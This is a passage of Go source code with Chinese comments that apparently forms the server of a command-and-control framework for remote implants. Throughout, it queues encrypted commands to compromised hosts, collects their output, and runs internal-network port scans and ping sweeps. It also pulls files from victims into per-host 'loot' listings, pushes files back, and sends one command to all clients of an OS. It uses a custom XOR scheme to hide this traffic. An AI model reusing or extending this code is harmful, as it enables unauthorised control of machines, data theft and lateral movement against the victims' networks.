				client_key[j] = client_key[j] ^ byte(pavi_key[2])
			}
		}
        for j := 768; j < len(client_key); j++ {
            if client_key[j] < byte(pavi_key[3]) {
				client_key[j] = client_key[j] ^ byte(pavi_key[3])
			}
        }
		key_map[uid] = string(client_key)
        keyPartArr[uid] = append(keyPartArr[uid],
            6, 17,
            int(math.Abs(float64(client_key[24] - 1))),
            int(client_key[13]),
            int(client_key[74]) + 24,
            45, 78,
            int(client_key[45]) + int(client_key[67]),
            int(client_key[79]) + int(client_key[89]) + int(client_key[106]),
            128,
            int(client_key[85]) + int(client_key[94]) + int(client_key[189]) + int(client_key[216]),
            256, 384,
            512 + int(client_key[196]),
            int(client_key[43]) + int(client_key[443]) + 640,
            768 + int(client_key[569]),
            len(client_key) - 25,
            int(math.Abs(math.Sin(float64(client_key[445])) * 128)) * 12,
            int(math.Log(float64(client_key[530])+1) * 255) * 24,
            int(math.Pow(float64(client_key[660]), 1) * 48),
            int(math.Sqrt(float64(client_key[970]))) * 64,
            (len(client_key) + int(client_key[1024])) * 128,
        )
	}
}

//插入密钥
func Insert_key(uid, username, shellname string) {
    charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    rand.Seed(time.Now().UnixNano())
    keyLength := rand.Intn(255) + 1024
    keyBuilder := strings.Builder{}
    // 生成密钥
    for i := 0; i < keyLength; i++ {
        randomIndex := rand.Intn(len(charset))
        keyBuilder.WriteByte(charset[randomIndex])
    }
    // 拼接完成的密钥
    key := keyBuilder.String()
    // 查找并更新对应的连接
    for i, conn := range data_conn.Conns {
        if uid == conn.Uid && username == conn.Username && shellname == conn.Host {
            data_conn.Conns[i].HostKey = key
            break
        }
    }
}

func DeleteEntry(delshell string) {
	if delshell != "" {
		mutex.Lock()
		defer mutex.Unlock()
		for i,conn := range data_conn.Conns{
			if delshell == conn.Uid{
				data_conn.Conns = append(data_conn.Conns[:i], data_conn.Conns[i+1:]...)
				break
			}
		}
	}
}
func SaveMsg(uid,msg string) {
    mutex.Lock()
    defer mutex.Unlock()
    msg_map[uid] = append(msg_map[uid],msg) // 入队
}
//msg_get插队
// 插队 msg_get 中 uid 对应的消息
func ChangeMsh(uid, s_id, pos string) {
    mutex.Lock()
    defer mutex.Unlock()
    queue, exists := msg_get[uid]
    if !exists || len(queue) == 0 {
        return
    }
    s_id_int, err1 := strconv.Atoi(s_id)
    pos_int, err2 := strconv.Atoi(pos)
    if err1 != nil || err2 != nil || s_id_int < 0 || s_id_int >= len(queue) || pos_int < 0 || pos_int > len(queue) {
        return
    }
    // 取出目标元素
    item := queue[s_id_int]
    // 从原位置移除
    queue = append(queue[:s_id_int], queue[s_id_int+1:]...)
    // 插入到目标位置
    if pos_int >= len(queue) {
        queue = append(queue, item)
    } else {
        queue = append(queue[:pos_int], append([]Msg_get_list{item}, queue[pos_int:]...)...)
    }
    msg_get[uid] = queue
}

//将msg_map输出
func GetMsgList(uid string) []string {
    mutex.Lock()
    defer mutex.Unlock()
    var result []string
    // 获取 msg_get 中的原始消息
    if queue_get, exists := msg_get[uid]; exists {
        for _, item := range queue_get {
            result = append(result, item.Ori_Msg)
        }
    }
    return result
}

// 获取结果
func Getresults(uid string) string {
    mutex.Lock()
    defer mutex.Unlock()
    queue, exists := msg_post[uid]
    if !exists || len(queue) == 0 {
        return ""
    }
    //出队
    msg_post[uid] = queue[1:]
    return queue[len(queue)-1] // 返回新的最后一个结果
}
//写入结果
func Results(uid, results string) {
    mutex.Lock()
    defer mutex.Unlock()
    key, exists := key_map[uid]
    if !exists {
        return
    }
    decry_results := Get_decry_s(&results, &key, &uid)
    go SaveMsg(uid,decry_results)
    // 写入结果队列
    msg_post[uid] = append(msg_post[uid], decry_results)
    // 日志记录
    var shellname string
    for i, client := range client_data.Clients {
        if uid == client.Uid {
            shellname = client_data.Clients[i].Host
            break
        }
    }
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    log_str := fmt.Sprintf("%v Host:%s  [%s]The bytes passed in is:[*%d...]\n",
        formattedTime, shellname, uid, len(results))
    logger.WriteLog(log_str)
}

// 获取指令
func GetMsg(uid string) string {
    mutex.Lock()
    defer mutex.Unlock()
    // 更新时间
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04:05")
    for i, client := range client_data.Clients {
        if uid == client.Uid {
            client_data.Clients[i].checkTime = formattedTime
            break
        }
    }
    queue, exists := msg_get[uid]
    _, hasKey := key_map[uid]
    if !exists || len(queue) == 0 {
        if !hasKey {
            return uid // 未注册客户端
        }
        return "" // 无任务
    }
    //出队
    msg := queue[0]               // 获取队首元素
    msg_get[uid] = queue[1:]      // 出队
    return msg.Encry_Msg          // 返回加密后的指令
}

//写入指令
func Getcmd(uid,cmd string)string{
	if uid != "" && cmd != "" && !strings.HasPrefix(cmd, "SwUVer^") && !strings.HasPrefix(cmd, "getHisports^") && !strings.HasPrefix(cmd, "getUfriends^") && !strings.HasPrefix(cmd, "loadUfile^") && !strings.HasPrefix(cmd, "getUfile^") {
		mutex.Lock()
		key, exists := key_map[uid]
		if exists {
			encryptedCmd := Get_encry_s(&cmd, &key,&uid)
            //id为当前对应索引长度
            new_msg := Msg_get_list{
                Ori_Msg: cmd,
                Encry_Msg: encryptedCmd,
            }
			msg_get[uid] = append(msg_get[uid],new_msg) // 入队
		}
		mutex.Unlock()
        if !strings.HasPrefix(cmd, "getTime^") && !strings.HasPrefix(cmd, "lookUpFile^"){
            go func(uid string){
                for _, client := range client_data.Clients {
                    if uid == client.Uid {
                        log_str := fmt.Sprintf("send %v,%v msg %v\n",client.Host,uid,cmd)
                        logger.WriteLog(log_str)
                    }
                }
            }(uid)
        }
	}else if strings.HasPrefix(cmd, "SwUVer^") {
		version := strings.Split(cmd, "^")[1]
		mutex.Lock()
		for i, client := range client_data.Clients {
			if uid == client.Uid {
				client_data.Clients[i].version = version
				key, exists := key_map[uid]
				if exists {
					encryptedCmd := Get_encry_s(&cmd, &key,&uid)
			        new_msg := Msg_get_list{
                        Ori_Msg: cmd,
                        Encry_Msg: encryptedCmd,
                    }                    
                    msg_get[uid] = append(msg_get[uid],new_msg) // 入队
				}
			}
		}
		mutex.Unlock()
	} else if strings.HasPrefix(cmd, "getHisports^") || strings.HasPrefix(cmd, "getUfriends^") {
		parts := strings.Split(cmd, "^")
		if len(parts) == 5 {
			sleep_time, err := strconv.Atoi(parts[3])
			if err != nil {
				return "delay is not int"
			}
			if sleep_time < 1 {
				sleep_time = 1
			}
			// 处理命令的第五部分
			part5 := "whatever"
			if parts[4] == "" {
				parts[4] = part5
			}
            if strings.HasPrefix(cmd, "getUfriends^") {
                ip_split := strings.Split(parts[1], ".")
                checkPart := Check_comment(ip_split[3],"ping")
                if !checkPart{
                    return "Format error"
                }
            }
            checkPart := Check_comment(parts[2],"port")
            if !checkPart{
                return "Format error"
            }
			newCmd := fmt.Sprintf("%s^%s^%s^%d^%s", parts[0], parts[1], parts[2], sleep_time,parts[4])
			key, exists := key_map[uid]
			if exists {
				encryptedCmd := Get_encry_s(&newCmd, &key,&uid)
				mutex.Lock()
			    new_msg := Msg_get_list{
                    Ori_Msg: cmd,
                    Encry_Msg: encryptedCmd,
                }                
                msg_get[uid] = append(msg_get[uid],new_msg) // 入队
				mutex.Unlock()
                log_str := fmt.Sprintf("send %v scan %v\n",uid,parts[1])
                logger.WriteLog(log_str)
			}
		}else {
			return "missing parameter"
		}
    }else if strings.HasPrefix(cmd, "getUfile^") || strings.HasPrefix(cmd, "loadUfile^") {
            var newCmd string
            parts := strings.Split(cmd, "^")
        
            if strings.HasPrefix(cmd, "getUfile^") {
                if len(parts) != 3 {
                    return "missing parameter"
                } else {
                    splitSizeStr := parts[len(parts)-1] // 获取最后一个参数
                    dotIndex := strings.Index(splitSizeStr, ".")
                    if dotIndex != -1 {
                        splitSizeStr = splitSizeStr[:dotIndex] // 去掉小数点后的部分
                    }
                    splitSize, err := strconv.Atoi(splitSizeStr)
                    if err != nil || splitSize <= 0 {
                        parts[len(parts)-1] = "1048576" // 设置默认值
                    } else {
                        // 转换后的整数重新赋值
                        parts[len(parts)-1] = strconv.Itoa(splitSize) 
                    }
                    newCmd = strings.Join(parts, "^") // 拼接回去
                }
            }
        
            if strings.HasPrefix(cmd, "loadUfile^") {
                if len(parts) != 2 {
                    return "missing parameter"
                } else {
                    str_parts := strings.Split(parts[1], "*")
                    splitSizeStr := strings.TrimSpace(str_parts[len(str_parts)-1]) // 获取最后一个参数
                    dotIndex := strings.Index(splitSizeStr, ".")
                    if dotIndex != -1 {
                        splitSizeStr = splitSizeStr[:dotIndex] // 去掉小数点后的部分
                    }
                    splitSize, err := strconv.Atoi(splitSizeStr)
                    if err != nil || splitSize <= 0 {
                        str_parts[len(str_parts)-1] = "1048576" // 设置默认值
                    } else {
                        // 转换后的整数重新赋值
                        str_parts[len(str_parts)-1] = strconv.Itoa(splitSize) 
                    }
                    newCmd = "loadUfile^" + strings.Join(str_parts, "*") // 拼接回去
                }
            }
            key, exists := key_map[uid]
            if exists {
                encryptedCmd := Get_encry_s(&newCmd, &key, &uid)
                mutex.Lock()
			    new_msg := Msg_get_list{
                    Ori_Msg: cmd,
                    Encry_Msg: encryptedCmd,
                }                
                msg_get[uid] = append(msg_get[uid],new_msg) // 入队
                mutex.Unlock()
            }
    }else {
        return "missing parameter"
	}
    return ""
}
//获取内网资产
func Net_getresults(uid string) (string, error) {
    if uid == "" {
        return "", fmt.Errorf("uid is empty")
    }
    mutex.Lock()
    key, exists1 := key_map[uid]
    shell_results, exists2 := shell_net_post[uid]
    if exists1 && exists2 {
        delete(shell_net_post, uid)
        mutex.Unlock()
        decryptedData := Get_decry_s(&shell_results, &key,&uid)
        go SaveMsg(uid,decryptedData)
        // 存入内网资产端口结构体...
        in_port(uid, decryptedData)
        return decryptedData, nil
    }
    mutex.Unlock()
    return "", fmt.Errorf("data not found for uid: %s", uid)
}

//写入内网资产
func Net_results(uid,results string) {
    mutex.Lock()
    shell_net_post[uid] = results
    key, exists := key_map[uid]
    mutex.Unlock()
    if exists {
        current := time.Now()
        formattedTime := current.Format("2006.01.02 15:04")
        go func(results, key, uid,formattedTime string) {
            var shellname string
            mutex.Lock()
            for _, client := range client_data.Clients {
                if uid == client.Uid {
                    shellname = client.Host
                    break
                }
            }
			mutex.Unlock()
            logStr := fmt.Sprintf("%v Host%s&&%sIncoming internal network assets:[*%d...]\n", formattedTime, shellname, uid, len(results))
            logger.WriteLog(logStr)
        }(results, key, uid,formattedTime)
    }
}
func Check_comment(check_parts, option string) bool {
    if strings.Contains(check_parts, "-") {
        split_int := strings.Split(check_parts, "-")
        s, se := strconv.Atoi(split_int[0])
        e, ee := strconv.Atoi(split_int[1])
        if se != nil || ee != nil || s < 0 || e < 0 {
            return false
        }
        if s > e {
            return false
        }
        if option == "port" && e > 65535 {
            return false
        } else if option == "ping" && e > 255 {
            return false
        }
    } else if strings.Contains(check_parts, ",") {
        uniquePorts := []string{}
        portMap := make(map[int]bool)
        split_int := strings.Split(check_parts, ",")
        for _, v := range split_int {
            port, err := strconv.Atoi(strings.TrimSpace(v))
            if err != nil || port < 0 {
                return false
            }
            if option == "port" && port > 65535 {
                return false
            } else if option == "ping" && port > 255 {
                return false
            }
            if !portMap[port] {
                portMap[port] = true
                uniquePorts = append(uniquePorts, strconv.Itoa(port))
            }
        }
    } else {
        _, err := strconv.Atoi(check_parts)
        return err == nil
    }
    return true
}

//写入内网资产端口
func in_port(uid, data string) {
    ipPorts := make(map[string][]string)
    re := regexp.MustCompile(`(\d+\.\d+\.\d+\.\d+):\[(\d+)\]`)
    matches := re.FindAllStringSubmatch(data, -1)
    for _, match := range matches {
        if len(match) >= 3 {
            ip := match[1]  // IP 地址
            port := match[2] // 端口
            ipPorts[ip] = append(ipPorts[ip], port)
        }
    }
    for ip, ports := range ipPorts {
        put_innet(uid, ip, ports)
    }
}

//删除内网
func Del_shell_innet(target,shellname,uid string)string{
	for i, innet := range data_innet.Innets {
		if target == innet.Target && uid == innet.Uid {
			data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
			return "Successfully deleted target"
		}
	}
    return "cannot deleted target"
}
func Check_clients()([]map[string]string, error) {
    mutex.Lock()
    defer mutex.Unlock()
    check_map := []map[string]string{}
    for _, server := range server_data.Servers {
        check_info := map[string]string{
            "port": server.Port,
            "client":  strconv.Itoa(server.Clients),
        }
        check_map = append(check_map, check_info)
    }
    if len(check_map) == 0 {
        return nil, fmt.Errorf("no clients found for the port:")
    }
    return check_map, nil
}
func Check_Time(username string) ([]map[string]string, error) {
    mutex.Lock()
    defer mutex.Unlock()
    check_map := []map[string]string{}
    for _, client := range client_data.Clients {
        if client.Username == username {
            check_info := map[string]string{
                "checkTime": client.checkTime,
                "uid":       client.Uid,
            }
            check_map = append(check_map, check_info)
        }
    }
    if len(check_map) == 0 {
        return nil, fmt.Errorf("no clients found for the username: %s", username)
    }
    return check_map, nil
}
func ServerIndex(Count string) ([]Server, error) {
    client_count, err := strconv.Atoi(Count)
    if err != nil {
        return nil, fmt.Errorf("invalid count: %v", err)
    }
    matchedCount := len(server_data.Servers)
    if client_count != matchedCount {
        var matchedServers []Server
        for _, server := range server_data.Servers {
            matchedServers = append(matchedServers, server)
        }
        if len(matchedServers) == 0 {
            return nil, fmt.Errorf("no servers found")
        }
        return matchedServers, nil
    }else {
        return nil, fmt.Errorf("no needed")
    }
}

type EnrichedClient struct {
    Username        string              `json:"username"`
    Host            string              `json:"host"`
    OS              string              `json:"os"`
    Delay           int                 `json:"delay"`
    OnlineTime      string              `json:"online_time"`
    ExternalIP      string              `json:"external_ip"`
    LocalIP         string              `json:"local_ip"`
    CurrentDir      string              `json:"current_dir"`
    Version         string              `json:"version"`
    Remarks         string              `json:"remarks"`
    CheckTime       string              `json:"check_time"`
    Uid             string              `json:"uid"`
    Server          string              `json:"server"`
    PluginParameter map[string]map[string][]string    `json:"plugin_parameter"`
}

func UserIndex(username, Count string) ([]EnrichedClient, error) {
    client_count, err := strconv.Atoi(Count)
    if err != nil {
        return nil, fmt.Errorf("invalid count: %v", err)
    }
    // 统计匹配数量
    matchedCount := 0
    for _, client := range client_data.Clients {
        if client.Username == username {
            matchedCount++
        }
    }
    if client_count == matchedCount {
        return nil, fmt.Errorf("no needed")
    }
    var matchedClients []EnrichedClient
    for _, client := range client_data.Clients {
        if client.Username != username {
            continue
        }
        // 生成当前 client 的 pluginParamMap
        pluginParamMap := make(map[string]map[string][]string)
        for _, plugin := range server_plugin.Plugins {
            if plugin.Remark == client.Server {
                os := plugin.os
                code := plugin.CodeWord
                desc := plugin.ParameterDesc
                if pluginParamMap[os] == nil {
                    pluginParamMap[os] = make(map[string][]string)
                }
                pluginParamMap[os][code] = desc
            }
        }
        enriched := EnrichedClient{
            Username:        client.Username,
            Host:            client.Host,
            OS:              client.OS,
            Delay:           client.Delay,
            OnlineTime:      client.OnlineTime,
            ExternalIP:      client.ExternalIP,
            LocalIP:         client.LocalIP,
            CurrentDir:      client.CurrentDir,
            Version:         client.version,
            Remarks:         client.Remarks,
            CheckTime:       client.checkTime,
            Uid:             client.Uid,
            Server:          client.Server,
            PluginParameter: pluginParamMap,
        }
        matchedClients = append(matchedClients, enriched)
    }
    return matchedClients, nil
}

//下载文件
func DownloadFile(uid, keyDecry string) ([]byte, error) {
    mutex.Lock()
    key, exists := key_map[uid]
    mutex.Unlock()
    if !exists {
        return nil, errors.New("key not found")
    }
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    filekey := Get_decry_s(&keyDecry, &key, &uid)
    existingData, exists := DownloadFile_byte_parts[filekey]
    if !exists {
        return nil, errors.New("file not found")
    }
    parts := strings.Split(filekey, "*")
    if len(parts) != 3 {
        delete(DownloadFile_byte_parts, filekey)
        return nil, errors.New("splitSize missing")
    }
    splitSize, err := strconv.Atoi(parts[2])
    if err != nil || splitSize <= 0 {
        delete(DownloadFile_byte_parts, filekey)
        return nil, errors.New("invalid splitSize")
    }
    currentPartsCount, exists := parts_count[filekey]
    if !exists {
        currentPartsCount = 0
    }
    totalParts := int(math.Ceil(float64(len(existingData)) / float64(splitSize)))
    if currentPartsCount >= totalParts {
        log_str := fmt.Sprintf("%v Host:[%s] File download successful: [%s]\n", formattedTime, uid, parts[1])
        logger.WriteLog(log_str)
        delete(DownloadFile_byte_parts, filekey)
        delete(parts_count, filekey)
        return nil, nil
    }
    start := currentPartsCount * splitSize
    end := start + splitSize
    if end > len(existingData) {
        end = len(existingData)
    }
    partData := existingData[start:end]
    parts_count[filekey] = currentPartsCount + 1
    log_str := fmt.Sprintf("%v Host:[%s] File downloading [%s], length: %v, part: %v\n", 
        formattedTime, uid, parts[1], len(partData), currentPartsCount)
    logger.WriteLog(log_str)
    if parts_count[filekey] >= totalParts {
        delete(DownloadFile_byte_parts, filekey)
        delete(parts_count, filekey)
    }
    return partData, nil
}
// 上传文件处理
func UploadFileHandler(uid,data string,header *multipart.FileHeader, file multipart.File){
    // 检查 UID 是否有效
    key, exists := key_map[uid]
    if !exists {
        return
    }
    key_part := []byte(key)
    decry_data := Get_decry_s(&data,&key,&uid)
    tempFilename := Get_decry_s(&header.Filename,&key,&uid)
    realFilename := getFilenameFromPath(tempFilename)
    data_list := strings.Split(decry_data,"^")
    username := data_list[0]
    splitSize := data_list[1]
    fileSize := data_list[2]
    start := data_list[3]
    end := data_list[4]
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    fileLog := fmt.Sprintf("%v A request to upload a file has been received", formattedTime)
    logger.WriteLog(fileLog)
    splitPos,_ := strconv.Atoi(splitSize)
    filePos, _ := strconv.Atoi(fileSize)
    startPos, _ := strconv.Atoi(start)
    endPos, _ := strconv.Atoi(end)
    // 缓存文件块
    var buffer bytes.Buffer
    _, err := io.Copy(&buffer, file)
    if err != nil {
        return
    }
    fileData := buffer.Bytes()
    fileLog1 := fmt.Sprintf("Received file chunk: %s, size: %dMB",realFilename, len(fileData)/(1024*1024))
    logger.WriteLog(fileLog1)
    // 拼接文件名
    receivedFilePath := "./uploads/" + uid + "/" + realFilename
    dirPath := filepath.Dir(receivedFilePath)
    // 检查目录是否存在
    if _, err := os.Stat(dirPath); os.IsNotExist(err) {
        // 如果目录不存在，则创建
        err := os.MkdirAll(dirPath, 0755)
        if err != nil {
            return
        }
    }
    // 将文件块保存到全局变量
    file_key := uid + "=" + realFilename
    mutex.Lock()
    if existingData, exists := UploadFile_byte_parts[file_key]; exists {
        // 如果存在已经保存的部分，将当前的分段追加到之前的字节流中
        UploadFile_byte_parts[file_key] = append(existingData, fileData...)
    } else {
        // 如果没有保存该文件的分段，则保存当前分段
        UploadFile_byte_parts[file_key] = fileData
    }
    mutex.Unlock()
    // 判断是否是最后一段，如果是，合并所有分段并解密
    if endPos == filePos {
        // 解密文件
        err := decryptFile(file_key,receivedFilePath,uid,key_part)
        if err != nil {
            return
        }
        // 解密后清空全局变量中的文件数据
        delete(UploadFile_byte_parts, file_key)
    }
    fileLog2 := fmt.Sprintf("%v ==== Received from user: %s, UID: %s, File: %s, Parts: %v, Range: %d-%d\n",
        formattedTime, username, uid, realFilename, splitPos/(1024*1024), startPos/(1024*1024), endPos/(1024*1024))
    logger.WriteLog(fileLog2)
}
// 解密文件
func decryptFile(receivedFile,receivedFilePath,uid string, key []byte) error {
    // 创建文件
    outputFile, err := os.Create(receivedFilePath)
    if err != nil {
        return err
    }
    defer outputFile.Close()
    // 调用解密函数
    err = Get_encry_f(receivedFile,uid, outputFile, key)
    if err != nil {
        return err
    }
    return nil
}
func getFilenameFromPath(path string) string {
    // 查找最后一个斜杠的位置，可以是 / 或 \
    lastSlash := strings.LastIndexAny(path, "/\\")
    if lastSlash == -1 {
        // 如果没有斜杠，直接返回原路径作为文件名
        return path
    }
    // 返回斜杠后面的部分作为文件名
    return path[lastSlash+1:]
}
//写入目录列表
func Put_file_list(uid,file string) {
	_,exists := key_map[uid]
	if exists{
		mutex.Lock()
		file_list[uid] = file
		mutex.Unlock()
	}
}

//读取文件列表
func Get_file_list(uid string)string{
	mutex.Lock()
	key, exists1 := key_map[uid]
	file,exists2:= file_list[uid]
	if exists1 && exists2 {
		mutex.Unlock()
		delete(file_list,uid)
		decryptedData:= Get_decry_s(&file, &key,&uid)
        go SaveMsg(uid,decryptedData)
        return decryptedData
	} else {
		mutex.Unlock() 
        return ""
	}
}

func Log_read() ([]string, error) {
    file, err := os.Open("lain.log")
    if err != nil {
        return nil, fmt.Errorf("log file in empty: %v", err)
    }
    defer file.Close()
    const maxLines = 50
    lines := make([]string, 0, maxLines)
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        lines = append(lines, scanner.Text())
        if len(lines) > maxLines {
            lines = lines[1:] // 保持队列大小不超过 maxLines
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, fmt.Errorf("log file error: %v", err)
    }
    return lines, nil
}

//获取用户所有战利品
func Get_loots(username string, w http.ResponseWriter, r *http.Request) {
    shell_list := []string{}
    for i, client := range client_data.Clients {
        if username == "lain" {
            // 查询所有主机
            shell_list = append(shell_list, client.Uid)
        } else if username == client.Username {
            // 查询用户所拥有的主机
            shell_list = append(shell_list, client_data.Clients[i].Uid)
        }
    }
    if len(shell_list) == 0 {
        http.Error(w,"no client", http.StatusNotFound)
        return
    }
    // 构建HTML响应
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    fmt.Fprintf(w, `<html><body><h2>User %s loot</h2><ul>`, username)
    for _, uid := range shell_list {
        // 构造用户 UID 目录路径
        dirPath := filepath.Join("uploads", uid)
        // 检查目录是否存在
        if _, err := os.Stat(dirPath); os.IsNotExist(err) {
            continue
        }
        // 读取该 UID 目录中的文件
        files, err := os.ReadDir(dirPath)
        if err != nil {
            http.Error(w,"no file", http.StatusInternalServerError)
            return
        }
        fmt.Fprintf(w, `<li><strong>UID: %s</strong><ul>`, uid)
        for _, file := range files {
            if !file.IsDir() {
                fileName := file.Name()
                // 构造下载路径，直接指向 uploads 目录
                filePath := fmt.Sprintf("/user_index?op=getloot&uid=%s&file=%s", uid, fileName)
                fmt.Fprintf(w, `<li>📄 %s <a href="%s" class="icon-download" style="cursor: pointer;">⬇️</a></li>`, fileName, filePath)
            }
        }
        fmt.Fprintf(w, `</ul></li>`)
    }
    fmt.Fprintf(w, `</ul></body></html>`)
}

// 前端上传文件
func UserUploadFile(uid, filename, splitSize string, fileContent []byte) {
    var logStr string
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    key, exists := key_map[uid]
    if !exists {
        logStr = fmt.Sprintf("%v %v key not exist\n", formattedTime, uid)
        logger.WriteLog(logStr)
        return // 提前返回
    }
    // 去掉小数点后的部分
    if dotIndex := strings.Index(splitSize, "."); dotIndex != -1 {
        splitSize = splitSize[:dotIndex]
    }
    // 转换 splitSize 为整数
    splitPos, err := strconv.Atoi(splitSize)
    if err != nil || splitPos <= 0 {
        splitSize = "1048576" // 默认值
    }
    // 加密文件内容
    encryptedFileContent, err := Get_decry_f(&fileContent, &key, &uid)
    if err != nil {
        logStr = fmt.Sprintf("%v %v file encrypted fail: %v\n", formattedTime, uid, filename)
        logger.WriteLog(logStr)
        return
    }
    // 存入全局变量
    file_key := uid + "*" + filename + "*" + splitSize
    DownloadFile_byte_parts[file_key] = encryptedFileContent
    logStr = fmt.Sprintf("%v %v file encrypted success: %v\n", formattedTime, uid, filename)
    logger.WriteLog(logStr)
}

//集体指令
func getAll(username,cmd,osType string){
	for i,client := range client_data.Clients{
		if username == client.Username{
			if osType == client_data.Clients[i].OS{
				mutex.Lock()
				key, exists := key_map[client.Uid]
				if exists {
					encryptedCmd := Get_encry_s(&cmd, &key,&client_data.Clients[i].Uid)
					new_msg := Msg_get_list{
                        Ori_Msg: cmd,
                        Encry_Msg: encryptedCmd,
                    }
                    msg_get[client_data.Clients[i].Uid] = append(msg_get[client_data.Clients[i].Uid],new_msg) // 入队
					mutex.Unlock()
				}
			}
		}
	}
}

func Get_Clients(username string) (map[string]string, error) {
    shell_list := make(map[string]string)
    // 遍历客户端数据
    for _, client := range client_data.Clients {
        if username == client.Username {
            shell_list[client.Uid] = client.Host
        }
    }
    if len(shell_list) == 0 {
        return nil, fmt.Errorf("no clients found for username: %s", username)
    }
    return shell_list, nil
}
func ClearUnmarkedGlobalVars() {
    globalVars := map[string]interface{}{
        "key1_map":               &key1_map,
        "key2_map":               &key2_map,
        "msg_get":               &msg_get,
        "msg_post":              &msg_post,
        "msg_map":               &msg_map,
        "file_list":              &file_list,
        "shell_net_post":         &shell_net_post,
        "sessionSlice":           &sessionSlice,
        "UploadFile_byte_parts":  &UploadFile_byte_parts,
        "DownloadFile_byte_parts": &DownloadFile_byte_parts,
        "parts_count":            &parts_count,
    }
    for _, ptr := range globalVars {
        value := reflect.ValueOf(ptr).Elem()
        if value.Kind() == reflect.Map {
            value.Set(reflect.MakeMap(value.Type()))
        } else if value.Kind() == reflect.Slice {
            value.Set(reflect.MakeSlice(value.Type(), 0, 0))
        } else if value.Kind() == reflect.String {
            value.SetString("")
        }
    }
    log_str := fmt.Sprintf("Memory cleanup complete!")
    logger.WriteLog(log_str)
}
//查询内网资产
func getInnet(uid string,w http.ResponseWriter) {
	var list_innet []Innet
	for _, innet := range data_innet.Innets {
		if uid == innet.Uid {
			list_innet = append(list_innet, innet)
		}
	}
	jsonData, err := json.Marshal(list_innet)
	if err != nil {
		http.Error(w,"json error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)
}
type MyLog struct{}
func (w *MyLog) WriteLog(logStr string) {
	file, err := os.OpenFile("lain.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Println("cat not log:", err)
		return
	}
	defer file.Close()
	log.SetOutput(file)
	log.Println(logStr)
}
// 加密函数
func EncryptDecrypt(input []byte, key []byte,uid string) []byte {
	if len(input) == 0 {
		return nil
	}
	var result []byte
	startIndex := 0
	for i := 0; i < len(keyPartArr[uid]); i++ {
		if len(input) <= keyPartArr[uid][i] {
            if keyPartArr[uid][i] < len(key){
                startIndex = len(key) % keyPartArr[uid][i]
                break
            }else{
                startIndex = keyPartArr[uid][i] % len(key) 
                break
            }
		}else{
			startIndex = len(key) % int(key[keyPartArr[uid][i]%len(key)])
		}
	}
	for i, b := range input {
		key_ := key[(startIndex+i)%len(key)]
		result = append(result, b^key_)
	}
	return result
}

// 加密文件
func Get_decry_f(data *[]byte, key,uid *string) ([]byte, error) {
    encrypted := EncryptDecrypt(*data, []byte(*key),*uid)
    return encrypted, nil
}
// 解密文件，处理加密字节流，解密后写入 outputFile
func Get_encry_f(encryptedkey,uid string, outputFile *os.File, key []byte) error {
    decrypted := EncryptDecrypt(UploadFile_byte_parts[encryptedkey], key,uid)
    _, err := outputFile.Write(decrypted)
    if err != nil {
        return err
    }
    return nil
}

// 加密字符串（Base64）
func Get_encry_s(input, key,uid *string) string {
	// 调用加密函数
	encryptedBytes := EncryptDecrypt([]byte(*input), []byte(*key),*uid)
	// 使用 Base64 进行编码
	return base64.URLEncoding.EncodeToString(encryptedBytes)
}

// 解密字符串（Base64）
func Get_decry_s(input, key,uid *string) string {
	// Base64 解码
	decodedBytes, err := base64.URLEncoding.DecodeString(*input)
	if err != nil {
		return ""
	}
	// 调用解密函数恢复原始数据
	decryptedBytes := EncryptDecrypt(decodedBytes, []byte(*key),*uid)
	return string(decryptedBytes)
}


/*结构体数据部分*/
//server插件结构体
type Plugin struct {
    Remark       string `json:"remark"`
    CodeWord   string `json:"codeWord"`
    Code       string `json:"code"`
    os         string `json:"os"`
    parameter  []string `json:"parameter"`
    ParameterDesc []string `json:"parameter_desc"`
}
type ServerPlugin struct {
    Plugins []Plugin `json:"servers"`
}
var server_plugin ServerPlugin
//server结构体
type Server struct{
    Port       string `json:"port"`
    Path       string `json:"path"`
    ConnPath   string `json:"conn_path"`
    MsgPath    string `json:"msg_path"`
    SwitchPath string `json:"switch_path"`
    EncryPath  string `json:"encry_path"`
    DownloadPath  string `json:"download_path"`
    ResultPath string `json:"result_path"`
    NetPath   string `json:"net_path"`
    InfoPath   string `json:"info_path"`
    UploadPath string `json:"upload_path"`
    ListPath   string `json:"list_path"`
    OptionPath string `json:"option_path"`
    Protocol   string `json:"protocol"`
    CertPath   string `json:"certPath"`
    KeyPath    string `json:"keyPath"`
    Clients    int    `json:"clients"`
    User   string `json:"user"`
    Remark     string `json:"remark"`
    Uid        string `json:"uid"`
    Hostname   string `json:"hostname"`
    KeyPart    string `json:"keyPart"`
    Filekey    string `json:"filekey"`
}
type Server_data struct{
    Servers []Server `json:"servers"`
}
var server_data Server_data 
//用户结构体
type User struct{
	Username    string `json:"username"`
	Password    string   `json:"password"`
}
type Data_user struct{
	Users []User `json:"users"`
}
var data_user Data_user

//主机结构体
type Client struct {
	Username    string `json:"username"`
	Host        string `json:"host"`
	OS          string `json:"os"`
	Delay        int    `json:"Delay"`
	OnlineTime  string `json:"online_time"`
	ExternalIP     string `json:"external_ip"`
	LocalIP     string `json:"local_ip"`
	CurrentDir  string `json:"currentDir"`
	version     string `json:"version"`
	Remarks     string `json:"Remarks"`
	checkTime   string `json:"checkTime"`
	Uid         string `json:"uid"`
    Server      string `json:"server"`
}
type Data struct {
	Clients []Client `json:"clients"`
}
var client_data Data

//get_conn结构体
type getConn struct{
	Username    string `json:"username"`
	Host        string `json:"host"`
	OnlineTime  string `json:"online_time"`
	HostKey     string `json:"host_key"`
	ShellIP     string `json:"shell_ip"`
	Uid         string `json:"uid"`
}
type Data_conn struct {
	Conns []getConn `json:"conns"`
}
var data_conn Data_conn

//内网资产结构体
type Innet struct {
    Uid    string   `json:"Uid"`
